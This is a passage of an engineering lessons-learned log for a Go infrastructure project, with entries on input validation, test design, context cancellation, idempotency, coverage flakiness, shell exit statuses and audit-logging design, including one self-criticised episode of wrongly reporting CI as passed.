    self and action URL from the server's own matched route template with each parameter re-escaped, so
    the URL's structure is always the server's and only the values are the caller's. The deleted
    middleware used `r.URL.Path` verbatim, which is caller input that happens to look like server output,
    the most confusing possible shape for a tainted value (`FAILURE_PATTERNS.md` #72). The matched route
    pattern was available the whole time and is the untainted equivalent. This is the same rule
    `FAILURE_PATTERNS.md` #63 drew for NATS subjects, applied to a second boundary: a value is not safe
    because of who usually produces it.

81. **A security test that fails intermittently is not flaky infrastructure, it is a test whose own setup
    is wrong, and the direction of the failure tells you how much luck you had.** A JWT forgery test
    "tampered" with a signature by changing the last base64url character, which for one signature in
    sixteen changed only padding bits the decoder discards, so the token was never altered and the
    validator correctly accepted it (`FAILURE_PATTERNS.md` #75). That failed loudly, claiming a forgery
    had slipped through. The identical defect in a test that silently stops forging anything would have
    passed, and would have reported that a validator rejects attacks it was never shown. Two mechanical
    rules follow. When a helper's doc comment states a guarantee, the helper should assert that guarantee
    at runtime, because prose cannot fail a build. And when a test manipulates an encoded representation
    to change the value underneath, it must verify the decoded value changed: encodings with padding,
    canonicalization, or case-insensitivity all admit edits that change the text and nothing else.

82. **A wire field must be named for the property key it actually reads, never for the value someone
    hopes is there.** `DispatchPayload`'s old `DeviceIP` field was filled from
    `device.Properties().String("ip")`, a key no device type in this codebase has ever populated; every
    real device stores its management address under `"host"` instead (`FAILURE_PATTERNS.md` #76). The
    field's own name asserted a fact about its contents that its initializer never actually verified, and
    that is exactly what let a completely non-functional dispatch path, one that silently skipped every
    real device while the endpoint still answered `200`, read as correct in the diff, in review, and in
    any test that only checked the response shape rather than the property key a real fixture device
    carries. A plausible-sounding field name is not evidence the value is real; the accessor or property
    key that actually fills a field is the only evidence that counts, and the field should be named after
    that, not after the concept it is hoped to represent. `pkg/wire.DispatchPayload.DeviceHost` cannot be
    filled from anything but the `"host"` key without the field itself changing name, which is the
    property the old `DeviceIP` name never had.

83. **An idempotency guard that only answers "has this started" is not a crash-recovery story, and a
    lease that reclaims by timestamp alone is not a fencing token.** `dispatch.JobStore.BeginFanOut`
    needed two separate, sequential fixes to actually survive a crash (`FAILURE_PATTERNS.md` #79-80): a
    `staleAfter` reclaim so a dead claimant's job could be picked back up at all, and only after that was
    reviewed, a `fence` column so a claimant that was merely slow, not dead, could not keep writing after
    a second party had already, correctly, reclaimed its work. These are two different guarantees.
    "Who may start the work" is answered by a one-shot conditional claim, the shape most idempotent
    consumer code stops at. "Who may still write the result" is a separate question a claim alone never
    answers, because a lease tells a second party when it is entitled to take over without doing anything
    to stop the first party from continuing to act as if it still owns what it lost. Any reclaim-by-
    timeout mechanism needs a monotonically increasing token bumped on every claim, required on every
    subsequent write, and rejected when stale, or two owners racing to finish the same unit of work will
    silently produce whichever one wrote last, with no error and no record a collision ever happened.
    Design the fencing token in the same change that adds the reclaim, not as a follow-up once someone
    notices the reclaim alone was not enough.

84. **A validated boundary at one entry point to a value does not validate every other entry point the
    same value later reaches; trace a value through every consumer, not just the one an earlier fix
    already covered.** `FAILURE_PATTERNS.md` #63 validated a job ID at the one HTTP handler
    (`StreamLogs`) that read it straight off a URL parameter before building a NATS subject from it.
    `FAILURE_PATTERNS.md` #81 found the identical unvalidated-concatenation shape, reaching the identical
    class of subject-injection bug, at a second, independent entry point for the same underlying value:
    `wire.DispatchPayload.JobID`, decoded off the wire on the Runner side, with no format check between
    `dispatch.JobStore.Create`'s own contract (which explicitly allows overriding the generated default)
    and the two subjects (`LogSubject`, `ResultSubject`) it is later concatenated into. Fixing one
    producer of a value, or one consumer of it, does not retroactively make every other producer or
    consumer safe; the only complete fix traces a value forward to every place it is used unvalidated, not
    backward to how it happened to get there this time. Where a value can cross a process or package
    boundary more than once (an HTTP request, a decoded wire payload, a database round trip), each
    crossing is its own trust boundary and needs its own check, even if an earlier fix already covered a
    different crossing of the conceptually "same" value.

85. **A handler your own code does not control (a plugin, an adapter, anything implementing an interface
    a future caller could satisfy however it likes) needs a `recover()` at the boundary that calls it, not
    just careful cleanup code that assumes it returns normally.** `internal/runner.executeWithLease`
    (`FAILURE_PATTERNS.md` #82) wrote its own post-execution cleanup (stop the heartbeat, wait for it to
    finish, then release the lease) as ordinary statements after the call to `a.adapter.Execute`, the exact
    shape that is correct for a normal return and silently skipped entirely by a panic, since a panic
    unwinds straight past any code that was merely *next*, not registered as a `defer`. The one part of
    that cleanup already wrapped in a `defer` (the lease release) still ran, but without the heartbeat
    synchronization the non-deferred statements were supposed to guarantee, opening a data race between
    that deferred release and a heartbeat goroutine that never got told to stop. `internal/event`'s own
    `handleDelivery` already had the right shape (`recover()` inside the one `defer` wrapping the handler
    call) for the identical reason -- a handler this codebase does not control must not be trusted to
    return normally -- and the new code should have looked for and reused that precedent instead of
    re-deriving a narrower one. Any code invoking a pluggable interface implementation should ask "what
    happens here if this call panics instead of returning" as a first-class design question, not an
    afterthought discovered by an adversarial reviewer.

86. **A context canceled by the very event you need to react to cannot also be the context that reaction
    depends on staying alive.** Two related bugs in `internal/runner.executeWithLease`
    (`FAILURE_PATTERNS.md` #83, #84) both had this same shape. `execCtx` was built as a direct child of
    `Agent.Run`'s own shutdown-cancelable context, so a graceful shutdown canceled it unconditionally --
    defeating `interruptible: false`'s entire purpose, which is to survive exactly that cancellation, not
    just a lease-heartbeat failure. Separately, `reportResult` durably recorded a job's outcome using that
    same context, so the outcome of a job canceled *by* that context's own cancellation could never be
    recorded, at precisely the moment recording it mattered most. Both were fixed the same way `executeWithLease`'s
    own `lease.Release(context.Background())` had already modeled, one function away, before either bug was
    introduced: cleanup, durability, or exception-handling work that must survive a cancellation signal
    cannot itself be a direct descendant of that signal. When a value needs to carry a parent context's
    *values* (a trace span, an actor identity) without inheriting its *cancellation*, a small value-only
    wrapper context is the correct tool, not `context.WithCancel(parent)` alone, which always propagates
    both. Before wiring any context into a cleanup or "must survive this" code path, ask specifically
    whether that context's own cancellation could be caused by the very condition the code exists to
    handle -- if so, it is the wrong context to use there, and an existing precedent for the fix, once
    introduced anywhere in the codebase (as it was here), should be checked for and reused every other
    place the identical shape of problem appears, not independently re-discovered by a second reviewer.

87. **An idempotency key must be derived from the logical operation, not minted fresh per attempt at
    recording it, or two attempts describing the same real-world event become indistinguishable from two
    different events.** `internal/runner`'s write-ahead log (`FAILURE_PATTERNS.md` #85) generated a random
    UUID every time an execution outcome was appended, reasoning (implicitly, by never considering the
    question) that the entry being appended was self-evidently new. It was not: a JetStream redelivery of
    an already-executed, already-locally-acknowledged job re-enters the exact same code path and appends
    what is, from the real world's point of view, the identical outcome a second time. `internal/event`'s
    own `DefaultIdempotencyKeyDerivation` doc comment already stated the general rule this violated (dedup
    only ever recognizes a key it has seen before, so a fresh random key can never be recognized as a
    duplicate of anything) and `internal/dispatch/worker_devices.go` already modeled the correct fix
    (`JobID+":"+DeviceID`, a key derived from the operation's own identity, stable across as many retries
    or redeliveries as that same operation produces) one package away. Any code that appends, publishes, or
    persists something on behalf of an operation that could plausibly be retried or redelivered needs to
    ask what makes two attempts at recording the *same* operation produce the *same* key, before reaching
    for a fresh randomly-generated one as the default -- randomness is the right choice for identifying a
    truly new thing, and the wrong one for identifying a retry of an old one.

88. **A document that has already solved a structural problem writes the solution down. Read its own
    policy before restructuring it.** Adding three transport phases to `IMPLEMENTATION.md` began as a
    plan to insert them at Phase 35 and renumber every later phase up by three, roughly 220
    cross-references across the specification tree plus the three root living documents plus 29 Go
    comments. None of that work was necessary, and doing it would have been actively wrong. Part IX's
    own preamble already states the rule this document follows: Phase 70 "is numbered 70 rather than 42
    only because 42 through 69 were already taken when it was found," and the reader is told to "read
    this Part's membership as 'orphans, in the order they were discovered,' not as a numeric range."
    Phases 70 and 71 sit physically between Phase 41 and Phase 42, out of numeric order, each with a
    dated correction note explaining why. The convention is: new work takes the next free number and is
    placed where it belongs thematically; nothing is ever renumbered. Following it turned a
    220-reference mechanical edit with real corruption risk into an append of `Part XV` and three new
    numbers, 72 through 74. The renumber would also have quietly broken something no number shift could
    repair: Part VII, "The Forge of Hephaestus," runs unbroken from Phase 30 to Phase 38 as one
    bootstrap-ordered program, and inserting at 35 would have split it into 30-34 and 38-40. The
    general rule is that a numbering scheme, a directory layout, or a naming convention that looks
    arbitrary usually is not, and the cheapest place to find out is the document's own prose. The
    planning artifact that proposed the renumber also had the arithmetic wrong (it assumed the highest
    phase was 70; it is 71), which is the ordinary outcome of planning against a remembered structure
    instead of a read one.

89. **"No value was specified" and "no value is needed" are different states, and collapsing them at the
    point of lookup silently disables whatever was supposed to supply the default.** `resolveDevices`
    treated an empty task target as "controller-side task, no device" and returned before consulting the
    resolver at all. At Crawl tier those two states really are the same thing, because a runbook's own
    `hosts:` key is the only source a device can come from, so the shortcut was invisible and correct for
    as long as one tier existed. In the Runner mesh they are not the same: the Controller already chose
    the device from the dispatch request's group, so an empty target means "the ambient default applies,"
    and the one component holding that default (the resolver) was the one thing never asked. The general
    shape is that an early return of the form "the input is empty, therefore there is nothing to do"
    forecloses every future supplier of that input, and does it invisibly, because the code that would
    have supplied it still exists, still compiles, and still has passing unit tests; it is simply never
    called. Prefer asking the pluggable collaborator and treating *its* empty answer as the terminal
    state. That costs one call and keeps the seam open. Note also which test caught this and which could
    not: every unit test in the owning package passed, because each supplied a fixture shaped like the
    tier the code was originally written for, and only the Release Gate driving the real, mesh-shaped
    path (a runbook with no `hosts:`, exactly what a real dispatch produces) could fail. A fixture that
    is more convenient than production is a fixture that cannot find this class of bug.
    (`internal/engine/executor.go`'s `resolveDevices`, `internal/adapters/native/resolver.go`.)

90. **A branch reached only by winning a race is not a covered branch, and a coverage floor measured
    against one is a scheduled CI failure.** `internal/election` sat at a 90.0% floor while its measured
    coverage swung from 85.0% to 100% across identical runs of identical code, because five arms of
    `LeaderElector.Run` (both `ctx.Err()` shutdown-race arms, the acquire `default` arm, the failed
    best-effort release, and the tick/cancel `continue`) had no test that drove them on purpose. They
    were reached, when they were reached, as a side effect of which way a real NATS store happened to
    lose a timing race in the container test. The number that resulted was a measurement of machine load,
    not of the test suite, and a loaded CI runner rolls the dice differently from an idle laptop. The
    failure therefore attached itself to whatever pull request was open when it fired, which is how one
    standing defect gets experienced as "CI keeps failing on our changes" and why nobody could reproduce
    it on demand. Two rules follow. First, if a branch exists because of a race, the test for it must
    *create* the race rather than wait for it: here, canceling the elector's own context from inside the
    mock's `KeepAlive`/`Acquire` call makes the cancellation guaranteed-visible the instant the call
    returns, which turns two irreducibly timing-dependent arms into ordinary deterministic ones with no
    sleep involved. Second, a ratchet floor must sit below the *deterministic minimum*, not below the
    best observed run; a floor set against a lucky measurement is indistinguishable from a floor set
    correctly until the day it is not. Note which direction the dependency ran: coverage here was being
    propped up by an integration test with real containers, so the number silently encoded "Docker was
    fast enough today." After the fix the same 97.5% holds under `-short` with the container test
    skipped entirely, which is the real evidence that the coverage belongs to the tests rather than to
    the environment. Knowing when to stop also matters: the one remaining uncovered arm needs `select`
    to choose a ready `ticker.C` over an equally ready `ctx.Done()`, which Go randomizes by design, and
    forcing it would have meant injecting a clock into production code to serve a coverage number. It
    was left uncovered on purpose, with the floor placed below it.
    (`internal/election/election_test.go`, `coverage-floor.json`, `tools/coverage-check`.)

91. **The module tree is shared mutable state, and `go test ./...` runs packages in parallel. A test
    that writes into it and a test that reads all of it are a data race with no race detector
    watching.** `internal/archtest` ran `go list -json -deps <module>/...` while
    `internal/forge/collectionscaffold` was creating and deleting a scaffolded package under
    `internal/catalog/test/relgate<PID>`, and `go list` matches directories in one phase and loads them
    in a second, so a directory that held `.go` files at match time and none at load time -- the window
    `os.RemoveAll` opens -- aborted the entire listing. The architecture test then failed with `cannot
    find package "."`, naming a directory that does not exist in the repository. Three properties made
    this expensive to find and worth writing down. It only reproduced under `./...`, because running
    either package alone removes the concurrency; it named a path nobody could grep for, because the
    directory is PID-suffixed and already deleted by the time anyone reads the log; and it presented as
    an *architecture* failure, which sends you reading import graphs rather than looking for a
    filesystem race. Note also that writing into the live tree was not laziness: the scaffold's
    generated test imports the package by its own `internal/...` path, and Go's internal-package rule
    makes that unimportable from a throwaway module, so a temp-module fixture genuinely cannot express
    what the release gate proves. When the shared resource cannot be removed, the reader has to
    tolerate it -- `go list -e` reports per-package load failures instead of aborting -- and the
    tolerance is only safe because something earlier and stricter (`make ci` runs `build` and `vet`
    over the whole module before any test) already guarantees a committed package cannot be broken
    here. The general rule: before adding a test that shells out to a tool which reads the *whole*
    repository, ask which other tests write to it, and remember that "no other test writes to the repo"
    stops being true the first time someone adds a code generator with a release gate. A corollary
    showed up in the same file: `collectionscaffold`'s cleanup removed the shared parent
    `internal/catalog/test` rather than its own subdirectory, which could delete a concurrently
    building sibling's package; `tools/gencatalog` had already hit that and left a warning comment, and
    the sibling call site had simply never been brought in line. A hazard documented in one call site's
    comment is not fixed anywhere else.
    (`internal/archtest/layering_test.go`'s `goList`,
    `internal/forge/collectionscaffold/release_gate_test.go`.)

92. **A test pinned to a different version of a dependency than the deployment runs is not testing the
    deployment, and `latest` on either side means nobody knows which version was tested.** This
    repository's container-backed tests named the NATS image at seventeen call sites across eleven
    packages, with no shared constant, and had drifted into three versions simultaneously: `nats:2.10`
    in the Phase 16 SSH mesh Release Gate, `internal/event`, `internal/runner` and `internal/topology`;
    `nats:2.11` in `internal/election`, `internal/lock` and both `cmd/controller` gates; and
    `nats:latest` in `tests/e2e`. `docker-compose.yml` also ran `latest`, so the deployment and the
    end-to-end test shared a fourth, moving version that no Release Gate had ever exercised, while the
    tests making the strongest claims -- that the mesh really reaches a real device, that leader
    election really prevents split brain -- were validating against a NATS four minor versions behind
    what a user would actually get. Nothing had failed yet, which is the point worth recording: this
    class of defect is invisible until the day a version-specific behavior change lands, and then it
    presents as a production bug that every test passed. The fix is structural, not vigilance: one
    pinned version per dependency, declared once (`internal/testsupport`), with the deployment
    descriptor asserted equal to it by a test, because a descriptor in YAML cannot import a Go constant
    and a second copy nobody checks is how the drift started. `latest` is not a version; it is
    "whatever the registry published before CI pulled it," which simultaneously makes a green build
    unreproducible tomorrow and lets an upstream release turn CI red on a commit that changed nothing.
    Two refinements matter in practice. First, distinguish harness patience from production semantics:
    a container *startup timeout* mirrors nothing in production (no production system boots a fresh
    broker per operation) and should be uniform and generous, whereas lease TTLs, ack policies and
    retry windows *are* production semantics and must never be shrunk to make tests faster. Second, a
    deliberate version pin is not drift: `internal/lock`'s bucket-config case pins `nats:2.10` inline
    because that version specifically rejects a config the test asserts is rejected, and sweeping it
    into the shared constant would have silently destroyed the assertion while leaving the test green.
    Centralize the accidents; leave the deliberate exceptions at the call site with a comment saying
    why. (`internal/testsupport`, `docker-compose.yml`, `internal/lock/nats_test.go`.)

93. **A specification's own prose describing a third-party CLI tool's interface can describe a version of
    that tool that no longer exists; verify against a real, currently-installed instance of the exact
    dependency before designing a parser or an invocation around it.** PLAN.md's own Legacy Ansible
    Interoperability section frames "inventory.json" as if any JSON document handed to
    `ansible-playbook -i` is interchangeable, and its own prose plus the general shape of "structured
    JSON event payload" in Phase 17's Release Gate wording both read naturally as pointing at Ansible's
    `json` stdout callback. Two real facts under that assumption turned out false, both caught only by
    actually running a real `ansible-core 2.19.11` rather than trusting the spec's own description.
    First: the `json` stdout callback was removed from Ansible core at the 2.10/2.11 collection split and
    was never carried into `community.general`; it survives only in the long-EOL, monolithic `ansible==2.9`
    package. `ANSIBLE_STDOUT_CALLBACK=json ansible-playbook ...` fails closed with `[ERROR]: Could not
    load 'json' callback plugin` on every currently-installable Ansible, and `ansible-doc -t callback -l`
    lists no `json` entry at all. The real, always-present input is the default `ansible.builtin.default`
    text callback at `-v` verbosity, which is not even reliably single-line JSON per result (a `debug`
    module's own result pretty-prints across several lines even at `-v`, confirmed by actually running
    one). Second: Ansible's real inventory-plugin auto-detection does not read a plain, non-executable
    `.json` file through the "script" plugin's flat `{"<group>": {"hosts": [...]}, "_meta":
    {"hostvars": {...}}}` contract at all -- that shape is for an executable inventory script Ansible runs
    and captures the stdout of. A static file carrying that shape produces a real, observed parse failure
    ("Invalid \"hosts\" entry for ... group, requires a dictionary, found ... list"). What actually works,
    confirmed by really running a playbook against it, is Ansible's "yaml" inventory plugin's own nested
    schema (`{"all": {"hosts": {...}, "children": {"<group>": {"hosts": {...}}}}}`) written as JSON, since
    JSON is valid YAML. Both mistakes share one root cause and one fix: a specification document describing
    an external tool's integration surface is a design intent, not a verified fact about that tool's
    current behavior, and the fix in both cases was to actually run the real dependency and design against
    what it does, not what the spec's prose assumed it still did. (`internal/adapters/legacy/stdout_parser.go`,
    `internal/adapters/legacy/inventory.go`, Phase 17: Legacy Ansible Adapter.)

## 94. A test fixture that no production code path reaches proves nothing, and its presence disguises the gap

Phase 18 found `tests/e2e` running a real PostgreSQL container against a codebase where no
binary could speak PostgreSQL. The container made the test look like the most thorough one in
the repository while it validated a database configuration that existed nowhere.

The rule is not "avoid containers". It is that the value of a fixture is entirely determined by
which production call path reaches it. Before trusting an expensive fixture, trace the path from
a real composition root to the thing the fixture provides. If no such path exists, the fixture
is set dressing, and it is worse than nothing because it buys unearned confidence.

The corollary is about defaults: `client.Schema.Create` versus the versioned migration runner
looked equivalent from inside the test, and only differed in that one of them was what
production actually ran. When a test reaches for a convenience API, check whether the real
system reaches for the same one.

## 95. Prove an assertion can fail before believing it passes, and expect defense in depth to make that harder than you think

Phase 18's adversarial pass deliberately broke the code each headline assertion guarded, to
confirm the assertion noticed. Disabling the inventory group predicate produced exactly the
designed failure: `dispatched=4` instead of `2`, with the untargeted devices named.

The zero-trust assertion was far more interesting. Unmounting the authentication middleware did
not make the unauthenticated-request assertion fail, because `RequireScope` independently
rejects a request with no identity in context. Opening that second gate did not make it fail
either, because the dispatch handler itself performs a third, independent identity check. Only
after opening all three did an unauthenticated dispatch return 202 and the assertion fail.

Two lessons. First, a negative control that does not produce a failure has not proven the
assertion is weak; it may have discovered real defense in depth, which is a stronger result
than the control failing would have been. Second, keep going until the assertion actually
fails, because until it does you have not learned whether it can.

## 96. A test that reaches another package by building a subprocess has no dependency edge, so the test cache will replay a stale pass

`tests/e2e` builds `cmd/controller` and `cmd/runner` with `go build` inside `TestMain` rather
than importing them. Go's test cache keys on the package's own inputs and its import graph, and
a subprocess build appears in neither, so editing the controller and re-running the test
replays a cached PASS from before the edit. This was hit for real during Phase 18's adversarial
pass: a deliberately broken controller reported `ok (cached)`.

Any test whose subject is reached through a subprocess, a container image built from local
source, or a generated artifact must run with `-count=1`, and the target that runs it should
pass that flag rather than relying on whoever types the command to remember.

## 97. A gitignored document has no undo, so scripted surgery on one needs a copy taken first and a search bounded to the section being edited

Phase 18 corrupted `.SPECIFICATION/IMPLEMENTATION.md` while checking off its own items. A script
replaced a checklist item by slicing between two markers found with `str.index`, which returns the
FIRST match in the whole document. Both end markers ("Adversarial Pattern Justification", "Provide
Commit Message") appear in every phase, so the match landed in an earlier phase, `end` came out lower
than `start`, and `src[:start] + new + src[end:]` re-appended everything between them. The file went
from roughly 9,700 lines to 16,830, with Phases 15 through 18 duplicated four times over.

Two independent mistakes, both worth naming. The first is the search: any marker used to bound an edit
in a large, repetitive document must either be proven unique or, far better, be searched for inside a
slice already narrowed to the section being edited. The repair script does the latter, cutting the
Phase 18 section out by heading first and asserting it contains exactly one phase heading before
touching anything.

The second is subtler and did the quieter damage. A follow-up `str.replace` used a search string that
was a complete line in Phase 18 but only a PREFIX of the same line in Phases 16 and 17, where the item
continued with more text. `replace` is a substring operation and hit all three, silently rewriting two
unrelated phases' checkboxes from `[x]` to `[ ]`. Anchor a replacement on something that terminates the
region it means to match, or bound it the same way.

What made this expensive rather than trivial is that `.SPECIFICATION/` is gitignored, matching
`.[A-Z]*`. There was no `git checkout` to fall back on and no clean copy anywhere: the only other copy
on disk was a stale 1,671-line worktree. Take a copy into a scratch directory before any scripted edit
to a gitignored file. It costs one command and it is the difference between an undo and an
archaeology exercise.

---

## 98. `omitempty` cannot express "included, and empty": a JSON field that must distinguish absent from empty needs a pointer

Found writing the first tests for `inventoryDTO`, which carries an inventory's group and device ids
on a detail read and omits them from a listing. Inlining every member id into a listing would make
opening a page of twenty inventories cost twenty fleet reads for data the page does not render, so the
projection takes a flag and the two shapes differ deliberately.

The code said so, at length:

```go
// Initialized rather than left nil, so the JSON carries [] instead of null
// for an empty inventory: a client should not have to guess which one null meant.
dto.Groups = set.GroupIDs
if dto.Groups == nil {
    dto.Groups = []int{}
}
```

and the struct tag quietly undid it:

```go
Groups []int `json:"groups,omitempty"`
```

`encoding/json` treats a slice as empty when its length is zero, whether it is nil or allocated. So the
carefully initialized `[]int{}` was dropped from the output exactly as a nil would have been, and an
inventory with no members rendered identically to a listing that never carried membership at all. The
one ambiguity the initialization existed to remove was the one that survived.

Nothing caught it because both readers were written by the same hand on the same day. The Go code
asserted against the struct, not the wire, and the UI read a field it was already populating.

The fix is `*[]int` with `omitempty`: a nil pointer is omitted, and a pointer to an empty slice
marshals as `[]`. The extra indirection is the point. It gives the type three states where the value
has two, and the third is the one the API contract needs.

**The rule.** `omitempty` collapses nil and empty for every length-having type — slices, maps, strings,
arrays. Whenever a field's absence carries meaning distinct from its emptiness, the type has to carry
that distinction itself, and a comment insisting on the difference is not a mechanism. Assert on the
serialized bytes, not on the struct, or the tag and the code can disagree indefinitely.

---

## 99. A consistency test whose two sides are derived from the same source cannot see a whole category go missing

The web UI computes which controls to render by asking an authorization chain which link relations an
identity may exercise, and the conformance suite proves the rendered controls match. That test is a
good one: it re-earns the API's own affordance guarantee in HTML, and it runs over every registered
view automatically.

It was green while the Run button rendered for nobody.

Record actions carry their own endpoint, with their own relation and scope. The candidate set handed to
the generator was built from the descriptor's CRUD operations alone and never included them. So the
action's relation was never offered, never permitted, and correctly filtered out of a set that could
never have contained it.

The conformance test compared what the UI rendered against what the generator permitted **over the same
candidate list**. Both sides read the same omission, both sides agreed, and the assertion passed
describing a state in which the feature did not exist. Every layer was individually correct; the defect
was entirely in what was never put in.

**The rule.** When a test asserts that two things agree, ask where each side gets its expectation. If
both trace back to one expression in the code under test, the test proves internal consistency and
nothing about completeness — and completeness is exactly what a registry-driven design needs proved,
because its failure mode is a category silently absent rather than a value wrongly computed. Anchor at
least one side outside the implementation: assert on the rendered output, on a hand-written list of
what should exist, or on a count that a human chose.

The corollary for UI work specifically: a control that fails to render is indistinguishable from a
control the caller may not see, and permission-gated interfaces are built to hide things quietly. Any
affordance whose only failure mode is silence needs a test that names the visible outcome.

---

## 100. A pipeline reports the exit status of its last command, so `make ci | tail` always succeeds

Ran the full gate as `make ci 2>&1 | tail -50`, to keep a very long log readable. The harness reported
exit code 0 and I told the user CI had passed.

It had not. `make` had failed at `docs-gen-check`, and the failure was visible in the very output I was
reading — `make: *** [Makefile:198: docs-gen-check] Error 1` was the last line on screen. The shell
reports the exit status of the **last** command in a pipeline, and `tail` always succeeds. The 0 came
from `tail`, and said nothing whatsoever about `make`.

The genuine defect underneath was ordinary: nine endpoints were added to `internal/apispec` without
regenerating `docs/reference` and `internal/api/wellknown`, so the committed OpenAPI document described
none of them. `docs-gen-check` exists precisely to catch that, it did catch it, and the pipeline threw
its verdict away.

Two things make this worse than a normal mistake. First, the wrong claim was confident and specific
("CI passed, exit 0"), because a numeric exit code reads as authoritative in a way that prose does not.
Second, the correct output was *right there*: this was not a case of missing information, it was a case
of trusting a summary over the log it summarized.

**It then happened again, within the hour, in a different shape.** The second attempt used
`set -o pipefail` and still reported success, because the command ended
`... | tail -25; echo "exit: $?"`. The `$?` inside the string was correct and printed 2; the status of
the whole compound was `echo`'s, which is 0. Adding `pipefail` fixed the pipe and left the trailing
command, and the trailing command had been added specifically to display the status that it then
replaced.

The third failure in the same episode was truncation: `tail -25` cut off the line naming which package
regressed, leaving twenty-five lines of unrelated 0.0% entries and a bare `FAIL`. The output was
useless for the one question being asked, and it looked complete.

**The rule.** A shell reports the status of the **last command in any compound**, whether the compound
is a pipe, a `;` chain, or an `&&` list. `set -o pipefail` fixes exactly one of those three. Never
append anything after the command whose status matters, and never read a status through a pipe.

The stronger habit, which does not depend on remembering shell semantics: **confirm the gate's own
success line, not an exit code.** `make ci` prints `ci: all checks passed` as its last line for
precisely this reason. Grep for that string. Its absence is the signal, and no exit code substitutes
for it. And when redirecting a long log, write it to a file and grep the file for the verdict rather
than tailing a fixed number of lines: the interesting line is wherever the failure happened, not at a
fixed offset from the end.

## 101. Cross-cutting recording belongs in a decorator over the port, not in the handlers, because the handlers are never the only writer

**The incident.** Building the activity stream, the obvious place to record a change was the API handler that performs it: `CreateOrganization` writes the row, then appends the entry. It reads well, it is easy to test, and it would have been wrong.

This control plane has two write surfaces over the same five entities. The JSON API's handlers are one. The web UI's view resources are the other, and they hold `access.Store` directly: `internal/ui/resources/organizations`'s writer calls `store.CreateOrganization` with no HTTP handler of this project's anywhere in the call stack. Recording from handlers would have covered the API completely, left the UI silent completely, and looked finished. Every test written against the covered surface would have passed. The gap would have been found by an auditor asking why a change somebody made in the browser is not in the trail.

The decorator wraps the port instead, and is composed once in `cmd/controller`, where a single `accessStore` value is handed both to `api.NewAccessHandler` and to `resources.RegisterAll`. Whatever holds the wrapped value is audited. There is no way to be half-wired, because there is no second place to remember.

Three consequences followed from the shape rather than being designed separately:

Every method is written out by hand rather than promoted from an embedded interface. Embedding compiles forever: a method added to `Store` later is delegated silently and unaudited, which is the same hole in a different shape. Twenty-seven explicit methods mean the day the port grows, the file stops compiling and somebody has to decide what the new method records. The cost, ten trivial delegating read methods, is paid back by a test that reflects over the port's real method set and fails on any mutating method with no coverage case.

An unattributed write is refused rather than recorded against "unknown". An audit trail containing anonymous rows is worse than one with gaps, because it looks complete: a reader scanning it concludes those changes were reviewed when nobody knows who made them. A path that legitimately has no user supplies a constant actor at the composition root, visibly.

The recording is not allowed to fail the write, and the write is not allowed to be reported as failed when it succeeded. A failed recording logs at Error and lets the write stand, because the change has happened and a caller told otherwise would retry and make it twice.

**The rule.** Anything that must happen for *every* write to a port belongs in a decorator over that port, composed once, not at the call sites. Before choosing the call site, list every caller of the port: if there is more than one kind of caller, the call site is the wrong place, and the second kind is the one that will be forgotten. And when the decorator must be written out method by method to keep that guarantee, check the table of methods against the interface's own method set by reflection, so the guarantee survives the port growing.

## 102. A form built from a static field list cannot describe a record whose fields are its own data

**The incident.** Phase 21's Templates view needed a launch form that renders only the fields the template being launched actually opened, since every other field is locked to what the template was saved with and the resolver reports a submitted value for one as ignored. The view layer's `RecordAction` declared `Fields []Field`: one list per action, shared by every record.

The two ways to build the form without changing that were both wrong in the same way. Rendering every field and reporting the locked ones after the launch means the operator types a value, submits, and the run uses something else, with the report arriving after the job exists. Rendering every field and disabling the locked ones is the same lie with better manners: it still tells a reader that this is a decision they are being offered.

**What was done.** `RecordAction` gained `FieldsFor func(ctx, id) ([]Field, error)`, and the handler resolves it once per request. The resolved set is what the form renders, what the submission is narrowed to, and what validation runs against, so a control the form never offered is refused rather than ignored. A resolution failure fails the request rather than rendering an empty form: an empty form is not "this record opens nothing", it is "we could not find out", and those must not look the same when the button underneath runs production work.

**Why it generalises.** The declaration-driven view layer here is a good design and this is its natural limit: a declaration describes a *resource*, and some things a UI must render are properties of a *record*. Whenever the answer to "which controls does this show" is stored in the row rather than in the code, the declaration has to become a function of the row. The alternative, one shared list plus an after-the-fact report, is the shape of every affordance this repository has recorded that silently did nothing.

## 103. A test that reaches its assertions through a timer decides how much of the code it covers, and a coverage ratchet cannot tell that from a regression

**The incident.** `make coverage` failed with `internal/dispatch: 77.3% dropped below its floor of 78.3%`, on a change that touched neither the package nor its tests. Running the package's own tests five times in a row gave 78.3, 78.3, 77.3, 78.3, 77.3: passing every time, and reporting a different number.

The source was `TestReaper_Run_RepublishesOnlyWhileLeader`, which starts the Reaper's real ticking loop with a ten millisecond interval under a sixty millisecond context and asserts on what reached the bus. That assertion is sound and the test is not flaky in the usual sense: it never failed. What varied was how many passes the loop got through before its context expired and which branches inside `sweep` each of those passes took, because that depends on when the scheduler ran the goroutine, and under `-race` on a loaded machine it varies by a lot.

So the package's measured coverage was a function of machine load, sitting a few tenths either side of a floor recorded from a lucky run. Half of CI's runs would fail the ratchet with nothing wrong, which is worse than a gate that is merely too loose: a check that fails at random is a check people learn to re-run rather than read.

**What was done.** `sweep` (one scan-and-republish pass) is exposed to the package's own tests through `export_test.go` and driven directly against each answer its store can give: nothing stale, a failed scan, and a list where one job's publish is refused. Those pass in microseconds and take the same branches every time. `Run`'s test keeps the ticker and now owns only what the ticker is for, which is the leadership gate.

The residual variance is a couple of tenths from `Run`'s own loop, and the floor now clears with margin on both sides rather than being met exactly.

**The rule.** Do not measure coverage of code whose branches are chosen by a timer. When a loop and the work inside it are both under test, separate them: the loop's test owns the scheduling and the leadership, and the work's test calls the work. A test that passes reliably can still cover unreliably, and a ratchet reads that as a regression, because from the outside a branch nobody ran and a branch somebody deleted are the same number.

## 104. A conformance measurement is itself code that can be wrong, and its characteristic failure is a hole shaped like the thing it measures

**The incident.** A parity suite was built to stop this repository being wrong about AWX compatibility, after three rounds of that wrongness being found by a person reading screenshots. It classified every field of a real job template export and reported 19 of 37 carried. A second, deliberately complex export then arrived and the ratchet did its job on the obvious half: eight new fields (`ask_execution_environment_on_launch`, `execution_environment`, `prevent_instance_group_fallback` and five more) failed the build by name.

It also silently passed something much worse. The new template bound three typed credentials, three labels and two instance groups, and the suite reported none of them, because AWX gives a job template **no root-level `credentials`, `labels` or `instance_groups` field**. Those relationships exist only as sub-resource URLs under `related` and as previews under `summary_fields`, and `summary_fields` had been classified as REST envelope, "nothing to represent". So the measurement dismissed one key and lost three entire relationships behind it, including every bound credential, while reporting a confident fraction.

